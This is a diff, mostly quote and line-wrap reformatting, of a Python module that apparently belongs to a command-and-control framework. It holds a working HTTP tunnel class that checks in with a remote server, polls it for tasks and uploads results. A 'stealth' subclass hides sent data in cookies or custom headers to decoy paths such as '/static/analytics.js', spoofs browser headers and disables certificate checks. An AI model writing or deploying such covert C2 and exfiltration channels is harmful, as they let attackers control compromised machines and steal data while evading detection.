@@ -13,10 +13,10 @@ HTTP 隧道 - HTTP/HTTPS Tunnel
     - 会话管理
 """
 
+import logging
 import time
 import uuid
-import logging
-from typing import Optional, Dict, Any, Union
+from typing import Any, Dict, Optional, Union
 
 from ..base import BaseTunnel, C2Config
 from ..encoding import C2Encoder, TrafficObfuscator
@@ -26,12 +26,14 @@ logger = logging.getLogger(__name__)
 # HTTP 客户端
 try:
     from core.http import HTTPClient, HTTPConfig, HTTPResponse
+
     HAS_HTTP_CLIENT = True
 except ImportError:
     HAS_HTTP_CLIENT = False
 
 try:
     import requests
+
     HAS_REQUESTS = True
 except ImportError:
     HAS_REQUESTS = False
@@ -81,7 +83,7 @@ class HTTPTunnel(BaseTunnel):
     @property
     def base_url(self) -> str:
         """获取基础 URL"""
-        protocol = 'https' if self.config.protocol == 'https' else 'http'
+        protocol = "https" if self.config.protocol == "https" else "http"
         return f"{protocol}://{self.config.server}:{self.config.port}"
 
     def connect(self) -> bool:
@@ -96,18 +98,17 @@ class HTTPTunnel(BaseTunnel):
 
             # 初始化会话
             init_data = {
-                'id': str(uuid.uuid4()),
-                'timestamp': int(time.time()),
+                "id": str(uuid.uuid4()),
+                "timestamp": int(time.time()),
             }
 
-            response = self._post(
-                self.config.checkin_path,
-                json=init_data
-            )
+            response = self._post(self.config.checkin_path, json=init_data)
 
             if response and self._is_success(response):
                 resp_data = self._get_json(response)
-                self._session_id = resp_data.get('session') or resp_data.get('id') or str(uuid.uuid4())[:16]
+                self._session_id = (
+                    resp_data.get("session") or resp_data.get("id") or str(uuid.uuid4())[:16]
+                )
                 self._connected = True
                 logger.debug(f"HTTP tunnel connected, session: {self._session_id}")
                 return True
@@ -123,10 +124,7 @@ class HTTPTunnel(BaseTunnel):
         """关闭 HTTP 会话"""
         if self._connected and self._session_id:
             try:
-                self._post(
-                    self.config.close_path,
-                    json={'session': self._session_id}
-                )
+                self._post(self.config.close_path, json={"session": self._session_id})
             except Exception as e:
                 logger.debug(f"Disconnect request failed: {e}")
 
@@ -160,20 +158,16 @@ class HTTPTunnel(BaseTunnel):
 
             # 构建请求
             request_data = {
-                'payload': encoded,
-                'timestamp': int(time.time() * 1000),
+                "payload": encoded,
+                "timestamp": int(time.time() * 1000),
             }
 
             headers = {
-                'X-Session': self._session_id,
-                'X-Request-ID': str(uuid.uuid4())[:8],
+                "X-Session": self._session_id,
+                "X-Request-ID": str(uuid.uuid4())[:8],
             }
 
-            response = self._post(
-                self.config.result_path,
-                headers=headers,
-                json=request_data
-            )
+            response = self._post(self.config.result_path, headers=headers, json=request_data)
 
             if response and self._is_success(response):
                 return True
@@ -206,20 +200,16 @@ class HTTPTunnel(BaseTunnel):
             self._rate_limit()
 
             headers = {
-                'X-Session': self._session_id,
+                "X-Session": self._session_id,
             }
 
-            response = self._get(
-                self.config.task_path,
-                headers=headers,
-                timeout=timeout
-            )
+            response = self._get(self.config.task_path, headers=headers, timeout=timeout)
 
             if response and self._is_success(response):
                 resp_data = self._get_json(response)
 
                 # 提取数据
-                encoded = resp_data.get('data') or resp_data.get('payload')
+                encoded = resp_data.get("data") or resp_data.get("payload")
                 if encoded:
                     return self.encoder.base64_decode(encoded)
 
@@ -250,14 +240,15 @@ class HTTPTunnel(BaseTunnel):
         elif HAS_REQUESTS:
             # 回退到 requests
             import requests
+
             session = requests.Session()
             session.verify = False
             session.headers.update(self._build_headers())
 
             if self.config.proxy:
                 session.proxies = {
-                    'http': self.config.proxy,
-                    'https': self.config.proxy,
+                    "http": self.config.proxy,
+                    "https": self.config.proxy,
                 }
 
             self._client = session
@@ -269,7 +260,7 @@ class HTTPTunnel(BaseTunnel):
         """关闭 HTTP 客户端"""
         if self._client:
             try:
-                if hasattr(self._client, 'close'):
+                if hasattr(self._client, "close"):
                     self._client.close()
             except Exception as exc:
                 logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)
@@ -279,13 +270,13 @@ class HTTPTunnel(BaseTunnel):
     def _build_headers(self) -> Dict[str, str]:
         """构建请求头"""
         headers = {
-            'User-Agent': self.config.user_agent,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
+            "User-Agent": self.config.user_agent,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Cache-Control": "no-cache",
+            "Pragma": "no-cache",
         }
         headers.update(self.config.headers)
         return headers
@@ -302,7 +293,7 @@ class HTTPTunnel(BaseTunnel):
 
     def _build_url(self, path: str) -> str:
         """构建完整 URL"""
-        if path.startswith('http'):
+        if path.startswith("http"):
             return path
         return f"{self.base_url}{path}"
 
@@ -311,17 +302,19 @@ class HTTPTunnel(BaseTunnel):
         path: str,
         headers: Optional[Dict[str, str]] = None,
         params: Optional[Dict[str, Any]] = None,
-        timeout: Optional[float] = None
+        timeout: Optional[float] = None,
     ) -> Optional[Any]:
         """发送 GET 请求"""
         url = self._build_url(path)
         timeout = timeout or self.config.timeout
 
         try:
-            if HAS_HTTP_CLIENT and hasattr(self._client, 'get'):
+            if HAS_HTTP_CLIENT and hasattr(self._client, "get"):
                 return self._client.get(url, headers=headers, params=params, timeout=timeout)
             elif HAS_REQUESTS:
-                return self._client.get(url, headers=headers, params=params, timeout=timeout, verify=False)
+                return self._client.get(
+                    url, headers=headers, params=params, timeout=timeout, verify=False
+                )
         except Exception as e:
             logger.debug(f"GET {path} failed: {e}")
             return None
@@ -332,17 +325,21 @@ class HTTPTunnel(BaseTunnel):
         headers: Optional[Dict[str, str]] = None,
         json: Optional[Dict[str, Any]] = None,
         data: Optional[Any] = None,
-        timeout: Optional[float] = None
+        timeout: Optional[float] = None,
     ) -> Optional[Any]:
         """发送 POST 请求"""
         url = self._build_url(path)
         timeout = timeout or self.config.timeout
 
         try:
-            if HAS_HTTP_CLIENT and hasattr(self._client, 'post'):
-                return self._client.post(url, headers=headers, json=json, data=data, timeout=timeout)
+            if HAS_HTTP_CLIENT and hasattr(self._client, "post"):
+                return self._client.post(
+                    url, headers=headers, json=json, data=data, timeout=timeout
+                )
             elif HAS_REQUESTS:
-                return self._client.post(url, headers=headers, json=json, data=data, timeout=timeout, verify=False)
+                return self._client.post(
+                    url, headers=headers, json=json, data=data, timeout=timeout, verify=False
+                )
         except Exception as e:
             logger.debug(f"POST {path} failed: {e}")
             return None
@@ -352,10 +349,10 @@ class HTTPTunnel(BaseTunnel):
         if response is None:
             return False
 
-        if hasattr(response, 'ok'):
+        if hasattr(response, "ok"):
             return response.ok
 
-        if hasattr(response, 'status_code'):
+        if hasattr(response, "status_code"):
             return 200 <= response.status_code < 400
 
         return False
@@ -365,7 +362,7 @@ class HTTPTunnel(BaseTunnel):
         if response is None:
             return 0
 
-        if hasattr(response, 'status_code'):
+        if hasattr(response, "status_code"):
             return response.status_code
 
         return 0
@@ -376,7 +373,7 @@ class HTTPTunnel(BaseTunnel):
             return {}
 
         try:
-            if hasattr(response, 'json'):
+            if hasattr(response, "json"):
                 result = response.json
                 if callable(result):
                     return result()
@@ -388,6 +385,7 @@ class HTTPTunnel(BaseTunnel):
 
 
 # ==================== 高级 HTTP 隧道 ====================
+
 
 class StealthHTTPTunnel(HTTPTunnel):
     """
@@ -402,16 +400,17 @@ class StealthHTTPTunnel(HTTPTunnel):
     def __init__(self, config: C2Config):
         super().__init__(config)
         import random
+
         self._random = random
 
     def send(self, data: bytes) -> bool:
         """隐蔽发送数据"""
         # 随机选择隐藏方式
-        method = self._random.choice(['body', 'cookie', 'header'])
+        method = self._random.choice(["body", "cookie", "header"])
 
-        if method == 'cookie':
+        if method == "cookie":
             return self._send_via_cookie(data)
-        elif method == 'header':
+        elif method == "header":
             return self._send_via_header(data)
         else:
             return super().send(data)
@@ -421,14 +420,11 @@ class StealthHTTPTunnel(HTTPTunnel):
         encoded = self.encoder.url_safe_encode(data)
 
         headers = {
-            'X-Session': self._session_id,
-            'Cookie': f'session={self._session_id}; data={encoded}',
+            "X-Session": self._session_id,
+            "Cookie": f"session={self._session_id}; data={encoded}",
         }
 
-        response = self._get(
-            '/static/analytics.js',  # 伪装路径
-            headers=headers
-        )
+        response = self._get("/static/analytics.js", headers=headers)  # 伪装路径
 
         return response is not None and self._is_success(response)
 
@@ -437,20 +433,17 @@ class StealthHTTPTunnel(HTTPTunnel):
         encoded = self.encoder.base64_encode(data)
 
         headers = {
-            'X-Session': self._session_id,
-            'X-Custom-Data': encoded,
-            'X-Timestamp': str(int(time.time())),
+            "X-Session": self._session_id,
+            "X-Custom-Data": encoded,
+            "X-Timestamp": str(int(time.time())),
         }
 
-        response = self._get(
-            '/api/status',  # 伪装路径
-            headers=headers
-        )
+        response = self._get("/api/status", headers=headers)  # 伪装路径
 
         return response is not None and self._is_success(response)
 
 
 __all__ = [
-    'HTTPTunnel',
-    'StealthHTTPTunnel',
+    "HTTPTunnel",
+    "StealthHTTPTunnel",
 ]
